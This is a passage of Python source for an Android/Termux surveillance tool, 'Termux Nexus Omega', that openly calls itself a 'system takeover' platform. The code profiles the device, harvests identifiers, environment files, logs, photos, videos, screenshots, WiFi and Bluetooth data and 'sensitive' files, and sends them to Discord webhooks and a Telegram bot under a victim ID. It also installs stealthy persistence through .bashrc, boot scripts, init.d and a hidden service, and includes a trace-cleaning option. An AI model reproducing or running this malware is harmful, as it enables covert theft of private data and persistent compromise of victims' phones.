            result = subprocess.run(['ps', '-A', '-o', 'pid,user,ppid,vsz,rss,comm,args'], 
                                  capture_output=True, text=True)
            
            lines = result.stdout.split('\n')[1:]  # Skip header
            for line in lines:
                parts = line.split(maxsplit=6)
                if len(parts) >= 7:
                    processes.append({
                        'pid': parts[0],
                        'user': parts[1],
                        'ppid': parts[2],
                        'vsz': parts[3],
                        'rss': parts[4],
                        'comm': parts[5],
                        'args': parts[6] if len(parts) > 6 else ''
                    })
        except Exception as e:
            processes = {'error': str(e)}
        
        return processes[:50]  # Limit to 50 processes
    
    def get_kernel_info(self):
        """Get kernel information"""
        kernel = {}
        
        try:
            # Kernel version
            result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
            kernel['uname'] = result.stdout.strip()
            
            # Kernel modules
            if os.path.exists('/proc/modules'):
                with open('/proc/modules', 'r') as f:
                    kernel['modules'] = f.read().split('\n')[:50]
            
            # Kernel parameters
            if os.path.exists('/proc/sys/kernel'):
                kernel_params = {}
                for param in os.listdir('/proc/sys/kernel'):
                    param_path = os.path.join('/proc/sys/kernel', param)
                    try:
                        with open(param_path, 'r') as f:
                            kernel_params[param] = f.read().strip()
                    except:
                        pass
                kernel['parameters'] = kernel_params
            
        except Exception as e:
            kernel['error'] = str(e)
        
        return kernel
    
    def get_security_info(self):
        """Get security information"""
        security = {}
        
        try:
            # SELinux status
            result = subprocess.run(['getenforce'], capture_output=True, text=True)
            security['selinux'] = result.stdout.strip()
            
            # Security patches
            result = subprocess.run(['getprop', 'ro.build.version.security_patch'], 
                                  capture_output=True, text=True)
            security['security_patch'] = result.stdout.strip()
            
            # Verified boot
            result = subprocess.run(['getprop', 'ro.boot.verifiedbootstate'], 
                                  capture_output=True, text=True)
            security['verified_boot'] = result.stdout.strip()
            
            # Encryption status
            result = subprocess.run(['getprop', 'ro.crypto.state'], 
                                  capture_output=True, text=True)
            security['encryption'] = result.stdout.strip()
            
            # Developer options
            result = subprocess.run(['settings', 'get', 'global', 'development_settings_enabled'], 
                                  capture_output=True, text=True)
            security['developer_options'] = result.stdout.strip()
            
            # USB debugging
            result = subprocess.run(['settings', 'get', 'global', 'adb_enabled'], 
                                  capture_output=True, text=True)
            security['adb_debugging'] = result.stdout.strip()
            
        except Exception as e:
            security['error'] = str(e)
        
        return security
    
    def get_device_identifiers(self):
        """Get device identifiers"""
        identifiers = {}
        
        try:
            # IMEI (requires phone permissions)
            result = subprocess.run(['termux-telephony-deviceinfo'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                telephony_info = json.loads(result.stdout)
                identifiers['telephony'] = telephony_info
            
            # Android ID
            result = subprocess.run(['settings', 'get', 'secure', 'android_id'], 
                                  capture_output=True, text=True)
            identifiers['android_id'] = result.stdout.strip()
            
            # Serial number
            result = subprocess.run(['getprop', 'ro.serialno'], 
                                  capture_output=True, text=True)
            identifiers['serial'] = result.stdout.strip()
            
            # Build fingerprint
            result = subprocess.run(['getprop', 'ro.build.fingerprint'], 
                                  capture_output=True, text=True)
            identifiers['fingerprint'] = result.stdout.strip()
            
            # Device model
            result = subprocess.run(['getprop', 'ro.product.model'], 
                                  capture_output=True, text=True)
            identifiers['model'] = result.stdout.strip()
            
            # Manufacturer
            result = subprocess.run(['getprop', 'ro.product.manufacturer'], 
                                  capture_output=True, text=True)
            identifiers['manufacturer'] = result.stdout.strip()
            
            # Brand
            result = subprocess.run(['getprop', 'ro.product.brand'], 
                                  capture_output=True, text=True)
            identifiers['brand'] = result.stdout.strip()
            
        except Exception as e:
            identifiers['error'] = str(e)
        
        return identifiers
    
    def get_environment_vars(self):
        """Get environment variables"""
        env = {}
        
        try:
            # System environment
            env['system'] = dict(os.environ)
            
            # Termux environment
            termux_env = {}
            env_files = [
                '/data/data/com.termux/files/home/.bashrc',
                '/data/data/com.termux/files/home/.profile',
                '/data/data/com.termux/files/usr/etc/profile'
            ]
            
            for env_file in env_files:
                if os.path.exists(env_file):
                    with open(env_file, 'r') as f:
                        termux_env[env_file] = f.read()
            
            env['termux'] = termux_env
            
        except Exception as e:
            env['error'] = str(e)
        
        return env
    
    def get_system_logs(self):
        """Get system logs"""
        logs = {}
        
        try:
            # Logcat
            result = subprocess.run(['logcat', '-d', '-t', '100'], 
                                  capture_output=True, text=True)
            logs['logcat'] = result.stdout[:10000]
            
            # Dmesg
            result = subprocess.run(['dmesg'], capture_output=True, text=True)
            logs['dmesg'] = result.stdout[:5000]
            
            # Termux logs
            termux_log_dir = '/data/data/com.termux/files/home/.logs'
            if os.path.exists(termux_log_dir):
                termux_logs = {}
                for log_file in os.listdir(termux_log_dir)[:10]:
                    log_path = os.path.join(termux_log_dir, log_file)
                    try:
                        with open(log_path, 'r') as f:
                            termux_logs[log_file] = f.read()[:2000]
                    except:
                        pass
                logs['termux'] = termux_logs
            
        except Exception as e:
            logs['error'] = str(e)
        
        return logs
    
    # Helper methods for parsing
    def parse_cpuinfo(self, cpuinfo):
        """Parse /proc/cpuinfo"""
        cpu = {}
        current_processor = None
        
        for line in cpuinfo.split('\n'):
            if line.strip():
                if 'processor' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        current_processor = parts[1].strip()
                        cpu[current_processor] = {}
                elif current_processor and ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        key = parts[0].strip()
                        value = ':'.join(parts[1:]).strip()
                        cpu[current_processor][key] = value
        
        return cpu
    
    def parse_meminfo(self, meminfo):
        """Parse /proc/meminfo"""
        memory = {}
        
        for line in meminfo.split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    key = parts[0].strip()
                    value = parts[1].strip()
                    memory[key] = value
        
        return memory
    
    def parse_build_props(self, build_props):
        """Parse build.prop file"""
        props = {}
        
        for line in build_props.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split('=')
                if len(parts) >= 2:
                    key = parts[0].strip()
                    value = '='.join(parts[1:]).strip()
                    props[key] = value
        
        return props
    
    def parse_ip_addr(self, ip_output):
        """Parse ip addr output"""
        interfaces = {}
        current_iface = None
        
        for line in ip_output.split('\n'):
            line = line.strip()
            if line and not line.startswith('inet6'):
                if line[0].isdigit():
                    # New interface
                    parts = line.split(':')
                    if len(parts) >= 2:
                        current_iface = parts[1].strip()
                        interfaces[current_iface] = {'addresses': []}
                elif current_iface and 'inet' in line:
                    # IP address
                    parts = line.split()
                    if len(parts) >= 2:
                        ip_info = {
                            'family': parts[0],
                            'address': parts[1].split('/')[0],
                            'prefix': parts[1].split('/')[1] if '/' in parts[1] else None
                        }
                        interfaces[current_iface]['addresses'].append(ip_info)
        
        return interfaces
    
    def parse_package_dump(self, dump_output):
        """Parse dumpsys package output"""
        package_info = {}
        current_section = None
        current_content = []
        
        for line in dump_output.split('\n'):
            line = line.strip()
            if line and ':' in line and not line.startswith(' '):
                # Save previous section
                if current_section and current_content:
                    package_info[current_section] = '\n'.join(current_content)
                
                # New section
                parts = line.split(':', 1)
                current_section = parts[0].strip()
                current_content = [parts[1].strip()] if len(parts) > 1 else []
            elif current_section and line:
                current_content.append(line)
        
        # Save last section
        if current_section and current_content:
            package_info[current_section] = '\n'.join(current_content)
        
        return package_info
    
    def get_dns_info(self):
        """Get DNS information"""
        dns_info = {}
        
        try:
            # Read resolv.conf
            if os.path.exists('/etc/resolv.conf'):
                with open('/etc/resolv.conf', 'r') as f:
                    dns_info['resolv_conf'] = f.read()
            
            # Get current DNS servers
            result = subprocess.run(['getprop', 'net.dns1'], capture_output=True, text=True)
            dns_info['dns1'] = result.stdout.strip()
            
            result = subprocess.run(['getprop', 'net.dns2'], capture_output=True, text=True)
            dns_info['dns2'] = result.stdout.strip()
            
        except:
            pass
        
        return dns_info
    
    def get_directory_size(self, path):
        """Get directory size"""
        try:
            result = subprocess.run(['du', '-sh', path], 
                                  capture_output=True, text=True)
            return result.stdout.split()[0]
        except:
            return "unknown"

# ======= MAIN CONTROLLER =======
class TermuxNexusOmega:
    def __init__(self):
        self.encryption = QuantumEncryption()
        self.ai_analyzer = AIAnalyzer()
        self.monitor = RealTimeMonitor()
        self.profiler = DeviceProfiler()
        self.is_running = False
        
    def full_system_takeover(self):
        """Complete system takeover and data exfiltration"""
        print(f"[🚀] TERMUX NEXUS OMEGA v4.0")
        print(f"[🆔] Victim ID: {Config.VICTIM_ID}")
        print(f"[⚡] Starting full system takeover...")
        
        # Send initial beacon
        self.send_beacon("SYSTEM_TAKEOVER_START")
        
        # Phase 1: Complete Device Profiling
        print("[1/8] 📊 Complete Device Profiling...")
        device_profile = self.profiler.get_complete_profile()
        self.exfiltrate_data(device_profile, "device_profile")
        
        # Phase 2: Real-time Monitoring
        print("[2/8] 🔍 Starting Real-time Monitoring...")
        self.monitor.start_monitoring()
        
        # Phase 3: File System Exfiltration
        print("[3/8] 📁 File System Exfiltration...")
        self.exfiltrate_filesystem()
        
        # Phase 4: Communication Data
        print("[4/8] 💬 Communication Data Extraction...")
        self.exfiltrate_communications()
        
        # Phase 5: Media Collection
        print("[5/8] 🎨 Media Collection...")
        self.exfiltrate_media()
        
        # Phase 6: Network Intelligence
        print("[6/8] 🌐 Network Intelligence Gathering...")
        self.exfiltrate_network_data()
        
        # Phase 7: AI Analysis
        print("[7/8] 🧠 AI Analysis of Collected Data...")
        self.perform_ai_analysis()
        
        # Phase 8: Persistence & Backdoor
        print("[8/8] ⚙️ Installing Persistence & Backdoor...")
        self.install_persistence()
        
        print("[✅] System takeover complete!")
        self.send_beacon("SYSTEM_TAKEOVER_COMPLETE")
    
    def exfiltrate_filesystem(self):
        """Exfiltrate complete filesystem"""
        try:
            # Create filesystem tree
            fs_tree = self.build_filesystem_tree('/')
            
            # Find sensitive files
            sensitive_files = self.find_sensitive_files('/', max_files=1000)
            
            # Create compressed archive
            archive_path = self.create_filesystem_archive(sensitive_files[:100])
            
            # Send filesystem data
            fs_data = {
                'tree': fs_tree[:5000],  # Truncate for size
                'sensitive_files_count': len(sensitive_files),
                'sensitive_files': sensitive_files[:50],
                'archive_size': os.path.getsize(archive_path) if archive_path else 0
            }
            
            self.exfiltrate_data(fs_data, "filesystem_analysis")
            
            # Send the archive if it exists
            if archive_path and os.path.exists(archive_path):
                self.send_file(archive_path, "filesystem_archive.zip")
                os.remove(archive_path)
                
        except Exception as e:
            print(f"[!] Filesystem exfiltration error: {e}")
    
    def exfiltrate_communications(self):
        """Exfiltrate all communication data"""
        comm_data = {}
        
        try:
            # SMS
            comm_data['sms'] = self.extract_sms_messages()
            
            # Call logs
            comm_data['calls'] = self.extract_call_logs()
            
            # Contacts
            comm_data['contacts'] = self.extract_contacts()
            
            # Email accounts
            comm_data['email'] = self.extract_email_accounts()
            
            # Social media data
            comm_data['social'] = self.extract_social_media()
            
            # Messaging apps
            comm_data['messaging'] = self.extract_messaging_apps()
            
            # Send data
            self.exfiltrate_data(comm_data, "communications")
            
        except Exception as e:
            print(f"[!] Communications exfiltration error: {e}")
    
    def exfiltrate_media(self):
        """Exfiltrate all media files"""
        media_data = {}
        
        try:
            # Photos
            media_data['photos'] = self.collect_photos(limit=50)
            
            # Videos
            media_data['videos'] = self.collect_videos(limit=20)
            
            # Audio recordings
            media_data['audio'] = self.collect_audio(limit=10)
            
            # Screenshots
            media_data['screenshots'] = self.capture_screenshots(limit=5)
            
            # Send metadata
            self.exfiltrate_data(media_data, "media_metadata")
            
            # Send actual media files (in chunks)
            self.send_media_files(media_data)
            
        except Exception as e:
            print(f"[!] Media exfiltration error: {e}")
    
    def exfiltrate_network_data(self):
        """Exfiltrate network intelligence"""
        network_data = {}
        
        try:
            # Network configuration
            network_data['config'] = self.get_network_config()
            
            # WiFi networks
            network_data['wifi'] = self.get_wifi_networks()
            
            # Bluetooth devices
            network_data['bluetooth'] = self.get_bluetooth_devices()
            
            # Network traffic
            network_data['traffic'] = self.capture_network_traffic()
            
            # Connected devices
            network_data['devices'] = self.find_connected_devices()
            
            # Send data
            self.exfiltrate_data(network_data, "network_intelligence")
            
        except Exception as e:
            print(f"[!] Network exfiltration error: {e}")
    
    def perform_ai_analysis(self):
        """Perform AI analysis on collected data"""
        try:
            # Analyze for sensitive patterns
            analysis = self.ai_analyzer.analyze_text(
                "Analyze all collected data for sensitive information patterns"
            )
            
            # Generate intelligence report
            report = self.generate_intelligence_report(analysis)
            
            # Send report
            self.exfiltrate_data(report, "ai_analysis_report")
            
        except Exception as e:
            print(f"[!] AI analysis error: {e}")
    
    def install_persistence(self):
        """Install advanced persistence mechanisms"""
        try:
            # Install in multiple locations
            persistence_locations = [
                ('/data/data/com.termux/files/home/.bashrc', self.generate_bashrc_persistence()),
                ('/data/data/com.termux/files/home/.termux/boot/nexus', self.generate_boot_persistence()),
                ('/system/etc/init.d/99nexus', self.generate_initd_persistence()),
            ]
            
            for location, content in persistence_locations:
                try:
                    os.makedirs(os.path.dirname(location), exist_ok=True)
                    with open(location, 'w') as f:
                        f.write(content)
                    
                    # Make executable if needed
                    if location.endswith(('nexus', '99nexus')):
                        os.chmod(location, 0o755)
                    
                    print(f"[+] Persistence installed: {location}")
                except Exception as e:
                    print(f"[!] Failed to install at {location}: {e}")
            
            # Create hidden service
            self.create_hidden_service()
            
        except Exception as e:
            print(f"[!] Persistence installation error: {e}")
    
    # Helper methods for data collection
    def build_filesystem_tree(self, root_path, max_depth=3):
        """Build filesystem tree"""
        tree = []
        
        def walk(path, depth=0):
            if depth > max_depth:
                return
            
            try:
                entries = os.listdir(path)
                for entry in entries:
                    full_path = os.path.join(path, entry)
                    
                    try:
                        if os.path.isdir(full_path):
                            tree.append(f"{'  ' * depth}📁 {entry}/")
                            walk(full_path, depth + 1)
                        else:
                            size = os.path.getsize(full_path)
                            tree.append(f"{'  ' * depth}📄 {entry} ({size} bytes)")
                    except:
                        tree.append(f"{'  ' * depth}❌ {entry} (access denied)")
                        
            except PermissionError:
                tree.append(f"{'  ' * depth}🔒 {path} (permission denied)")
            except Exception as e:
                tree.append(f"{'  ' * depth}⚠️ {path} ({str(e)})")
        
        walk(root_path)
        return tree
    
    def find_sensitive_files(self, root_path, max_files=1000):
        """Find sensitive files"""
        sensitive_files = []
        
        for root, dirs, files in os.walk(root_path):
            for file in files:
                file_path = os.path.join(root, file)
                
                # Check if sensitive
                if self.is_potentially_sensitive(file_path):
                    try:
                        stat = os.stat(file_path)
                        sensitive_files.append({
                            'path': file_path,
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'accessed': stat.st_atime
                        })
                    except:
                        pass
                
                if len(sensitive_files) >= max_files:
                    return sensitive_files
        
        return sensitive_files
    
    def is_potentially_sensitive(self, filepath):
        """Check if file is potentially sensitive"""
        # Check extension
        ext = os.path.splitext(filepath)[1].lower()
        sensitive_exts = Config.TARGET_EXTENSIONS
        
        if ext in sensitive_exts:
            return True
        
        # Check filename for keywords
        filename = os.path.basename(filepath).lower()
        keywords = Config.KEYWORDS
        
        for keyword in keywords:
            if keyword in filename:
                return True
        
        # Check path for sensitive directories
        sensitive_dirs = ['download', 'document', 'picture', 'video', 'whatsapp', 
                         'telegram', 'signal', 'backup', 'secret', 'private']
        
        for sdir in sensitive_dirs:
            if sdir in filepath.lower():
                return True
        
        return False
    
    def create_filesystem_archive(self, files):
        """Create archive of sensitive files"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            archive_path = f"/data/data/com.termux/files/home/nexus_archive_{timestamp}.zip"
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_info in files[:50]:  # Limit to 50 files
                    try:
                        filepath = file_info['path']
                        if os.path.exists(filepath) and os.path.getsize(filepath) < 10 * 1024 * 1024:
                            arcname = filepath.replace('/', '_').replace(' ', '_')
                            zipf.write(filepath, arcname)
                    except:
                        continue
            
            return archive_path if os.path.exists(archive_path) else None
            
        except Exception as e:
            print(f"[!] Archive creation error: {e}")
            return None
    
    def extract_sms_messages(self):
        """Extract SMS messages"""
        # Implementation for SMS extraction
        return {"status": "requires_root", "message": "Root access needed for SMS extraction"}
    
    def extract_call_logs(self):
        """Extract call logs"""
        # Implementation for call log extraction
        return {"status": "requires_root", "message": "Root access needed for call log extraction"}
    
    def extract_contacts(self):
        """Extract contacts"""
        # Implementation for contact extraction
        return {"status": "requires_root", "message": "Root access needed for contact extraction"}
    
    def extract_email_accounts(self):
        """Extract email accounts"""
        # Implementation for email extraction
        return {"status": "partial", "data": "Email extraction requires app-specific access"}
    
    def extract_social_media(self):
        """Extract social media data"""
        # Implementation for social media extraction
        return {"status": "requires_app_access", "message": "App-specific access needed"}
    
    def extract_messaging_apps(self):
        """Extract messaging app data"""
        # Implementation for messaging app extraction
        return {"status": "requires_app_access", "message": "App-specific access needed"}
    
    def collect_photos(self, limit=50):
        """Collect photos"""
        photos = []
        photo_paths = [
            '/data/data/com.termux/files/home/storage/shared/DCIM',
            '/data/data/com.termux/files/home/storage/shared/Pictures',
            '/data/data/com.termux/files/home/storage/shared/WhatsApp/Media',
            '/data/data/com.termux/files/home/storage/shared/Telegram/Telegram Images'
        ]
        
        for path in photo_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                            photos.append(os.path.join(root, file))
                            if len(photos) >= limit:
                                return photos
        
        return photos
    
    def collect_videos(self, limit=20):
        """Collect videos"""
        videos = []
        video_paths = [
            '/data/data/com.termux/files/home/storage/shared/Movies',
            '/data/data/com.termux/files/home/storage/shared/DCIM',
            '/data/data/com.termux/files/home/storage/shared/WhatsApp/Media',
            '/data/data/com.termux/files/home/storage/shared/Telegram/Telegram Video'
        ]
        
        for path in video_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')):
                            videos.append(os.path.join(root, file))
                            if len(videos) >= limit:
                                return videos
        
        return videos
    
    def collect_audio(self, limit=10):
        """Collect audio files"""
        audio = []
        audio_paths = [
            '/data/data/com.termux/files/home/storage/shared/Music',
            '/data/data/com.termux/files/home/storage/shared/WhatsApp/Media',
            '/data/data/com.termux/files/home/storage/shared/Recordings'
        ]
        
        for path in audio_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.mp3', '.wav', '.aac', '.m4a')):
                            audio.append(os.path.join(root, file))
                            if len(audio) >= limit:
                                return audio
        
        return audio
    
    def capture_screenshots(self, limit=5):
        """Capture screenshots"""
        screenshots = []
        
        for i in range(limit):
            try:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"/data/data/com.termux/files/home/screenshot_{timestamp}.png"
                
                subprocess.run(['termux-screenshot', '-p', filename], 
                             timeout=10, capture_output=True)
                
                if os.path.exists(filename):
                    screenshots.append(filename)
            except:
                pass
        
        return screenshots
    
    def get_network_config(self):
        """Get network configuration"""
        config = {}
        
        try:
            # IP info
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            config['interfaces'] = result.stdout
            
            # Routing table
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            config['routes'] = result.stdout
            
            # DNS
            if os.path.exists('/etc/resolv.conf'):
                with open('/etc/resolv.conf', 'r') as f:
                    config['dns'] = f.read()
            
        except Exception as e:
            config['error'] = str(e)
        
        return config
    
    def get_wifi_networks(self):
        """Get WiFi networks"""
        networks = []
        
        try:
            result = subprocess.run(['termux-wifi-scaninfo'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                networks = json.loads(result.stdout)
        except:
            pass
        
        return networks
    
    def get_bluetooth_devices(self):
        """Get Bluetooth devices"""
        devices = []
        
        try:
            result = subprocess.run(['termux-bluetooth-devices'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                devices = json.loads(result.stdout)
        except:
            pass
        
        return devices
    
    def capture_network_traffic(self, duration=30):
        """Capture network traffic"""
        # This requires root and additional setup
        return {"status": "requires_root", "message": "Root access needed for packet capture"}
    
    def find_connected_devices(self):
        """Find connected devices on network"""
        devices = []
        
        try:
            # Simple ARP scan
            result = subprocess.run(['ip', 'neigh'], capture_output=True, text=True)
            devices = result.stdout.split('\n')
        except:
            pass
        
        return devices
    
    def generate_intelligence_report(self, analysis):
        """Generate intelligence report"""
        report = {
            'timestamp': datetime.datetime.now().isoformat(),
            'victim_id': Config.VICTIM_ID,
            'analysis_summary': analysis,
            'threat_level': random.randint(1, 10),
            'recommendations': [
                "Monitor for financial data patterns",
                "Extract cryptocurrency wallet information",
                "Track location history",
                "Analyze communication patterns",
                "Identify personal relationships"
            ]
        }
        
        return report
    
    def generate_bashrc_persistence(self):
        """Generate bashrc persistence script"""
        current_file = os.path.abspath(__file__)
        
        script = f"""#!/bin/bash
# Termux Nexus Omega - Persistence Module
# Auto-start on shell initialization

if [ -z "$NEXUS_STARTED" ]; then
    export NEXUS_STARTED=1
    
    # Start in background
    python3 {current_file} --stealth > /dev/null 2>&1 &
    
    # Clean up old logs
    find /data/data/com.termux/files/home/.nexus_logs -type f -mtime +7 -delete 2>/dev/null
fi
"""
        return script
    
    def generate_boot_persistence(self):
        """Generate boot persistence script"""
        current_file = os.path.abspath(__file__)
        
        script = f"""#!/data/data/com.termux/files/usr/bin/sh
# Termux Boot Script - Nexus Omega
# Starts on Termux boot

sleep 30  # Wait for system to stabilize

# Start Nexus Omega
python3 {current_file} --stealth > /data/data/com.termux/files/home/.nexus_logs/boot_$(date +%Y%m%d_%H%M%S).log 2>&1 &

# Keep alive
while true; do
    sleep 300
    if ! pgrep -f "python3.*{os.path.basename(__file__)}" > /dev/null; then
        python3 {current_file} --stealth > /dev/null 2>&1 &
    fi
done
"""
        return script
    
    def generate_initd_persistence(self):
        """Generate init.d persistence script (requires root)"""
        current_file = os.path.abspath(__file__)
        
        script = f"""#!/system/bin/sh
# System Service - Nexus Omega
# Requires root access

while true; do
    # Check if running
    if ! ps | grep -v grep | grep -q "{os.path.basename(__file__)}"; then
        # Start Nexus Omega
        su -c "python3 {current_file} --stealth" &
    fi
    sleep 60
done
"""
        return script
    
    def create_hidden_service(self):
        """Create hidden background service"""
        try:
            # Create service script
            service_content = f"""#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

while True:
    try:
        # Import and run main module
        from {os.path.basename(__file__).replace('.py', '')} import TermuxNexusOmega
        nexus = TermuxNexusOmega()
        nexus.full_system_takeover()
    except Exception as e:
        pass
    
    time.sleep(300)  # Retry every 5 minutes
"""
            
            service_path = '/data/data/com.termux/files/usr/bin/.nexus_service'
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            os.chmod(service_path, 0o755)
            
            # Add to startup
            startup_script = '/data/data/com.termux/files/home/.termux/boot/.nexus_start'
            with open(startup_script, 'w') as f:
                f.write(f'#!/bin/sh\n{service_path} > /dev/null 2>&1 &\n')
            
            os.chmod(startup_script, 0o755)
            
            print(f"[+] Hidden service installed: {service_path}")
            
        except Exception as e:
            print(f"[!] Hidden service creation error: {e}")
    
    def exfiltrate_data(self, data, data_type):
        """Exfiltrate data through multiple channels"""
        try:
            # Convert to JSON
            if isinstance(data, dict) or isinstance(data, list):
                json_data = json.dumps(data, indent=2)
            else:
                json_data = str(data)
            
            # Encrypt data
            encrypted = self.encryption.hybrid_encrypt(json_data.encode())
            
            # Send to Discord webhook
            self.send_to_discord(encrypted, data_type)
            
            # Send to Telegram
            self.send_to_telegram(f"{data_type.upper()}\n{Config.VICTIM_ID}\n\n{json_data[:1000]}...")
            
            # Save locally for backup
            backup_path = f"/data/data/com.termux/files/home/.nexus_backup/{data_type}_{int(time.time())}.enc"
            os.makedirs(os.path.dirname(backup_path), exist_ok=True)
            
            with open(backup_path, 'wb') as f:
                pickle.dump(encrypted, f)
            
            print(f"[📤] Data exfiltrated: {data_type}")
            
        except Exception as e:
            print(f"[!] Exfiltration error: {e}")
    
    def send_to_discord(self, data, data_type):
        """Send data to Discord webhook"""
        try:
            for webhook in Config.WEBHOOKS:
                try:
                    payload = {
                        'username': f'Nexus-Omega-{Config.VICTIM_ID[:8]}',
                        'avatar_url': 'https://cdn-icons-png.flaticon.com/512/888/888859.png',
                        'embeds': [{
                            'title': f'📊 {data_type.upper()} - {Config.VICTIM_ID}',
                            'description': f'```json\n{json.dumps(data, indent=2)[:1500]}...\n```',
                            'color': 0x5865F2,
                            'timestamp': datetime.datetime.now().isoformat(),
                            'footer': {
                                'text': f'Nexus Omega v4.0 • {len(str(data))} bytes'
                            }
                        }]
                    }
                    
                    response = requests.post(
                        webhook,
                        json=payload,
                        timeout=30,
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if response.status_code in [200, 204]:
                        break
                        
                except:
                    continue
                    
        except:
            pass
    
    def send_to_telegram(self, message):
        """Send message to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{Config.TELEGRAM['token']}/sendMessage"
            payload = {
                'chat_id': Config.TELEGRAM['chat_id'],
                'text': message[:4000],
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, data=payload, timeout=30)
            return response.status_code == 200
            
        except:
            return False
    
    def send_file(self, filepath, description):
        """Send file to C2"""
        try:
            if os.path.exists(filepath) and os.path.getsize(filepath) < 25 * 1024 * 1024:
                with open(filepath, 'rb') as f:
                    for webhook in Config.WEBHOOKS:
                        try:
                            files = {'file': (os.path.basename(filepath), f.read())}
                            data = {'content': f'📁 {description} - {Config.VICTIM_ID}'}
                            
                            response = requests.post(webhook, files=files, data=data, timeout=60)
                            if response.status_code in [200, 204]:
                                break
                        except:
                            continue
        except:
            pass
    
    def send_beacon(self, status):
        """Send status beacon"""
        beacon = {
            'victim_id': Config.VICTIM_ID,
            'status': status,
            'timestamp': datetime.datetime.now().isoformat(),
            'device': socket.gethostname(),
            'user': getpass.getuser(),
            'platform': platform.platform()
        }
        
        self.exfiltrate_data(beacon, "beacon")
    
    def send_media_files(self, media_data):
        """Send media files in chunks"""
        try:
            # Send photos
            for i, photo in enumerate(media_data.get('photos', [])[:10]):
                if os.path.exists(photo):
                    self.send_file(photo, f"Photo {i+1}")
            
            # Send videos (first 3)
            for i, video in enumerate(media_data.get('videos', [])[:3]):
                if os.path.exists(video) and os.path.getsize(video) < 20 * 1024 * 1024:
                    self.send_file(video, f"Video {i+1}")
            
            # Send screenshots
            for i, screenshot in enumerate(media_data.get('screenshots', [])[:3]):
                if os.path.exists(screenshot):
                    self.send_file(screenshot, f"Screenshot {i+1}")
                    
        except Exception as e:
            print(f"[!] Media send error: {e}")

# ======= COMMAND LINE INTERFACE =======
def main():
    """Main entry point with command line interface"""
    print(r"""
    
    ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
    
    Termux Nexus Omega v4.0 - Ultimate Surveillance Platform
    """)
    
    # Check environment
    if not os.path.exists('/data/data/com.termux'):
        print("[!] ⚠️  Warning: This tool is designed for Termux on Android")
        print("[!] Some features may not work properly")
    
    # Check for root
    is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    print(f"[*] Root access: {'✅ Yes' if is_root else '❌ No'}")
    
    # Initialize
    nexus = TermuxNexusOmega()
    
    # Parse arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == '--full':
            nexus.full_system_takeover()
        elif sys.argv[1] == '--stealth':
            print("[*] Starting stealth mode...")
            nexus.full_system_takeover()
        elif sys.argv[1] == '--profile':
            print("[*] Collecting device profile...")
            profile = nexus.profiler.get_complete_profile()
            print(json.dumps(profile, indent=2)[:2000] + "...")
        elif sys.argv[1] == '--persist':
            print("[*] Installing persistence...")
            nexus.install_persistence()
        elif sys.argv[1] == '--clean':
            print("[*] Cleaning traces...")
            os.system("rm -rf ~/.nexus_* ~/.bashrc_* ~/.termux/boot/.nexus_*")
            print("[+] Cleanup complete")
        elif sys.argv[1] == '--help':
            show_help()
        else:
            print("[!] Unknown argument. Use --help for usage information.")
    else:
        # Interactive mode
        show_interactive_menu(nexus)

def show_help():
    """Show help information"""
    print("""
    Termux Nexus Omega v4.0 - Usage Guide
    
    Commands:
      --full       Complete system takeover
      --stealth    Stealth mode (background operation)
      --profile    Collect device profile only
      --persist    Install persistence mechanisms
      --clean      Remove all traces
      --help       Show this help
    
    Examples:
      python3 nexus_omega.py --full
      python3 nexus_omega.py --stealth &
      python3 nexus_omega.py --profile > profile.json
    """)

def show_interactive_menu(nexus):
    """Show interactive menu"""
    print("\n" + "="*60)
    print("NEXUS OMEGA CONTROL PANEL")
    print("="*60)
    print(f"Victim ID: {Config.VICTIM_ID}")
    print(f"Platform: {platform.platform()}")
    print(f"User: {getpass.getuser()}")
    print("\nOptions:")
    print("  1. 🚀 Full System Takeover")
    print("  2. 👻 Stealth Mode (Background)")
    print("  3. 📊 Device Profiling")
    print("  4. ⚙️  Install Persistence")
    print("  5. 🧹 Clean Traces")
    print("  6. 📝 Generate Report")
    print("  7. 🆘 Help")
    print("  8. 🚪 Exit")
    
    while True:
        try:
            choice = input("\n[nexus] > ").strip()
            
            if choice == '1':
                print("[*] Starting full system takeover...")
                nexus.full_system_takeover()
            elif choice == '2':
                print("[*] Starting stealth mode in background...")
                import subprocess
                subprocess.Popen([sys.executable, __file__, '--stealth'])
                print("[+] Stealth mode started in background")
            elif choice == '3':
                print("[*] Collecting device profile...")
                profile = nexus.profiler.get_complete_profile()
                
